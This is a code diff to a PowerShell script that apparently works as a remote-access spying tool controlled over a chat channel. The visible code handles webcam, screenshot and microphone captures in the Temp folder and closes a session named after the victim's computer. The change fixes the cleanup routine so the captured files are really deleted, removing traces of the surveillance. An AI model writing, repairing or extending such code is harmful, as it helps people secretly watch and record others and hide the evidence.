@@ -418,13 +418,13 @@ function Cleanup {
 $campath = "$env:Temp\Image.jpg"
 $screenpath = "$env:Temp\Screen.jpg"
 $micpath = "$env:Temp\Audio.mp3"
-    If (!(Test-Path $campath)){  
+    If (Test-Path $campath){  
         rm -Path $campath -Force
     }
-    If (!(Test-Path $screenpath)){  
+    If (Test-Path $screenpath){  
         rm -Path $screenpath -Force
     }
-    If (!(Test-Path $micpath)){  
+    If (Test-Path $micpath){  
         rm -Path $micpath -Force
     }
 }
@@ -572,7 +572,7 @@ while ($true) {
         if ($messages -eq 'close'){
             sendMsg -Message ":no_entry: ``Closing Session : $env:COMPUTERNAME`` :no_entry:"
             Cleanup
-            sleep 1
+            sleep 2
             exit      
         }
     }
